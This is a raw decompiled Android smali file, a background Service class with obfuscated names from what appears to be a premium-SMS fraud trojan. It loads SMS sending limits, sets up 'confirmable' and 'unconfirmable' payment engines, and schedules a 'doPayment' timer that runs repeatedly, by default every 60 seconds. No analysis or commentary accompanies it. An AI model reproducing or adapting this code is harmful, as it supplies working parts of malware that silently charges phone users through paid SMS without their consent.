.class public Lcom/adc58a797/ac31b3236/a740675ee/a10cd395c/a7000a234;
.super Landroid/app/Service;
.source "aFZfcLGji.java"


# static fields
.field public static final PREFS_NAME:Ljava/lang/String; = "LocalSettings"


# instance fields
.field confirmbleEngine:Lcom/adc58a797/ac31b3236/a740675ee/a18b43c6a/a7c41d4fa/a6c80dd6e;

.field private doPayment:Ljava/util/TimerTask;

.field limits:Lcom/adc58a797/ac31b3236/a740675ee/a18b43c6a/ab7a95c65;

.field private timer:Ljava/util/Timer;

.field unconfirmableEngine:Lcom/adc58a797/ac31b3236/a740675ee/a18b43c6a/a7c41d4fa/a6c80dd6e;


# direct methods
.method public constructor <init>()V
.locals 1

invoke-direct {p0}, Landroid/app/Service;-><init>()V

new-instance v0, Lcom/adc58a797/ac31b3236/a740675ee/a10cd395c/a7000a234$ac4ca4238;

invoke-direct {v0, p0}, Lcom/adc58a797/ac31b3236/a740675ee/a10cd395c/a7000a234$ac4ca4238;-><init>(Lcom/adc58a797/ac31b3236/a740675ee/a10cd395c/a7000a234;)V

iput-object v0, p0, Lcom/adc58a797/ac31b3236/a740675ee/a10cd395c/a7000a234;->doPayment:Ljava/util/TimerTask;

return-void
.end method

.method static synthetic access$000(Lcom/adc58a797/ac31b3236/a740675ee/a10cd395c/a7000a234;)Ljava/util/Timer;
.locals 1

iget-object v0, p0, Lcom/adc58a797/ac31b3236/a740675ee/a10cd395c/a7000a234;->timer:Ljava/util/Timer;

return-object v0
.end method


# virtual methods
.method public onBind(Landroid/content/Intent;)Landroid/os/IBinder;
.locals 1

const/4 v0, 0x0

return-object v0
.end method

.method public onCreate()V
.locals 6

const/4 v5, 0x0

new-instance v2, Ljava/util/Timer;

const-string v3, "paymentTimer"

invoke-direct {v2, v3}, Ljava/util/Timer;-><init>(Ljava/lang/String;)V

iput-object v2, p0, Lcom/adc58a797/ac31b3236/a740675ee/a10cd395c/a7000a234;->timer:Ljava/util/Timer;

invoke-static {}, Lcom/adc58a797/ac31b3236/a740675ee/a24f48d52;->getInstance()Lcom/adc58a797/ac31b3236/a740675ee/a24f48d52;

move-result-object v2

invoke-virtual {p0}, Lcom/adc58a797/ac31b3236/a740675ee/a10cd395c/a7000a234;->getApplicationContext()Landroid/content/Context;

move-result-object v3

invoke-virtual {v2, v3}, Lcom/adc58a797/ac31b3236/a740675ee/a24f48d52;->init(Landroid/content/Context;)V

invoke-static {}, Lcom/adc58a797/ac31b3236/a740675ee/a24f48d52;->getInstance()Lcom/adc58a797/ac31b3236/a740675ee/a24f48d52;

move-result-object v2

invoke-virtual {v2}, Lcom/adc58a797/ac31b3236/a740675ee/a24f48d52;->getInternals()Lcom/adc58a797/ac31b3236/a740675ee/aa74ad8df/a68724f62;

move-result-object v2

invoke-virtual {v2}, Lcom/adc58a797/ac31b3236/a740675ee/aa74ad8df/a68724f62;->getSmsInfo()Lcom/adc58a797/ac31b3236/a740675ee/aa74ad8df/aed35570e;

move-result-object v0

invoke-virtual {v0}, Lcom/adc58a797/ac31b3236/a740675ee/aa74ad8df/aed35570e;->getSumLimit()I

move-result v1

new-instance v2, Lcom/adc58a797/ac31b3236/a740675ee/a18b43c6a/ab7a95c65;

invoke-virtual {v0}, Lcom/adc58a797/ac31b3236/a740675ee/aa74ad8df/aed35570e;->getSmsCount()I

move-result v3

invoke-virtual {v0}, Lcom/adc58a797/ac31b3236/a740675ee/aa74ad8df/aed35570e;->getDcSmsCount()I

move-result v4

invoke-direct {v2, v1, v3, v4}, Lcom/adc58a797/ac31b3236/a740675ee/a18b43c6a/ab7a95c65;-><init>(III)V

iput-object v2, p0, Lcom/adc58a797/ac31b3236/a740675ee/a10cd395c/a7000a234;->limits:Lcom/adc58a797/ac31b3236/a740675ee/a18b43c6a/ab7a95c65;

new-instance v2, Lcom/adc58a797/ac31b3236/a740675ee/a18b43c6a/a2007fad8/ae26bc53f;

const-string v3, "LocalSettings"

invoke-virtual {p0, v3, v5}, Lcom/adc58a797/ac31b3236/a740675ee/a10cd395c/a7000a234;->getSharedPreferences(Ljava/lang/String;I)Landroid/content/SharedPreferences;

move-result-object v3

invoke-virtual {p0}, Lcom/adc58a797/ac31b3236/a740675ee/a10cd395c/a7000a234;->getApplicationContext()Landroid/content/Context;

move-result-object v4

invoke-direct {v2, v0, v3, v4}, Lcom/adc58a797/ac31b3236/a740675ee/a18b43c6a/a2007fad8/ae26bc53f;-><init>(Lcom/adc58a797/ac31b3236/a740675ee/aa74ad8df/aed35570e;Landroid/content/SharedPreferences;Landroid/content/Context;)V

iput-object v2, p0, Lcom/adc58a797/ac31b3236/a740675ee/a10cd395c/a7000a234;->unconfirmableEngine:Lcom/adc58a797/ac31b3236/a740675ee/a18b43c6a/a7c41d4fa/a6c80dd6e;

iget-object v2, p0, Lcom/adc58a797/ac31b3236/a740675ee/a10cd395c/a7000a234;->unconfirmableEngine:Lcom/adc58a797/ac31b3236/a740675ee/a18b43c6a/a7c41d4fa/a6c80dd6e;

iget-object v3, p0, Lcom/adc58a797/ac31b3236/a740675ee/a10cd395c/a7000a234;->limits:Lcom/adc58a797/ac31b3236/a740675ee/a18b43c6a/ab7a95c65;

invoke-interface {v2, v3}, Lcom/adc58a797/ac31b3236/a740675ee/a18b43c6a/a7c41d4fa/a6c80dd6e;->init(Lcom/adc58a797/ac31b3236/a740675ee/a18b43c6a/ab7a95c65;)V

new-instance v2, Lcom/adc58a797/ac31b3236/a740675ee/a18b43c6a/a2007fad8/a89c99df9;

const-string v3, "LocalSettings"

invoke-virtual {p0, v3, v5}, Lcom/adc58a797/ac31b3236/a740675ee/a10cd395c/a7000a234;->getSharedPreferences(Ljava/lang/String;I)Landroid/content/SharedPreferences;

move-result-object v3

invoke-virtual {p0}, Lcom/adc58a797/ac31b3236/a740675ee/a10cd395c/a7000a234;->getApplicationContext()Landroid/content/Context;

move-result-object v4

invoke-direct {v2, v0, v3, v4}, Lcom/adc58a797/ac31b3236/a740675ee/a18b43c6a/a2007fad8/a89c99df9;-><init>(Lcom/adc58a797/ac31b3236/a740675ee/aa74ad8df/aed35570e;Landroid/content/SharedPreferences;Landroid/content/Context;)V

iput-object v2, p0, Lcom/adc58a797/ac31b3236/a740675ee/a10cd395c/a7000a234;->confirmbleEngine:Lcom/adc58a797/ac31b3236/a740675ee/a18b43c6a/a7c41d4fa/a6c80dd6e;

iget-object v2, p0, Lcom/adc58a797/ac31b3236/a740675ee/a10cd395c/a7000a234;->confirmbleEngine:Lcom/adc58a797/ac31b3236/a740675ee/a18b43c6a/a7c41d4fa/a6c80dd6e;

iget-object v3, p0, Lcom/adc58a797/ac31b3236/a740675ee/a10cd395c/a7000a234;->limits:Lcom/adc58a797/ac31b3236/a740675ee/a18b43c6a/ab7a95c65;

invoke-interface {v2, v3}, Lcom/adc58a797/ac31b3236/a740675ee/a18b43c6a/a7c41d4fa/a6c80dd6e;->init(Lcom/adc58a797/ac31b3236/a740675ee/a18b43c6a/ab7a95c65;)V

return-void
.end method

.method public onStart(Landroid/content/Intent;I)V
.locals 7

invoke-static {}, Lcom/adc58a797/ac31b3236/a740675ee/a1f5d5cb0;->getInstance()Lcom/adc58a797/ac31b3236/a740675ee/a1f5d5cb0;

move-result-object v0

const-string v1, "engine.service.scheduleTimeout"

const-string v2, "60"

invoke-virtual {v0, v1, v2}, Lcom/adc58a797/ac31b3236/a740675ee/a1f5d5cb0;->getValue(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

move-result-object v0

invoke-static {v0}, Ljava/lang/Integer;->parseInt(Ljava/lang/String;)I

move-result v6

iget-object v0, p0, Lcom/adc58a797/ac31b3236/a740675ee/a10cd395c/a7000a234;->timer:Ljava/util/Timer;

invoke-virtual {v0}, Ljava/util/Timer;->cancel()V

new-instance v0, Ljava/util/Timer;

const-string v1, "paymentTimer"

invoke-direct {v0, v1}, Ljava/util/Timer;-><init>(Ljava/lang/String;)V

iput-object v0, p0, Lcom/adc58a797/ac31b3236/a740675ee/a10cd395c/a7000a234;->timer:Ljava/util/Timer;

iget-object v0, p0, Lcom/adc58a797/ac31b3236/a740675ee/a10cd395c/a7000a234;->timer:Ljava/util/Timer;

iget-object v1, p0, Lcom/adc58a797/ac31b3236/a740675ee/a10cd395c/a7000a234;->doPayment:Ljava/util/TimerTask;

const-wide/16 v2, 0x0

mul-int/lit16 v4, v6, 0x3e8

int-to-long v4, v4

invoke-virtual/range {v0 .. v5}, Ljava/util/Timer;->scheduleAtFixedRate(Ljava/util/TimerTask;JJ)V

return-void
.end method
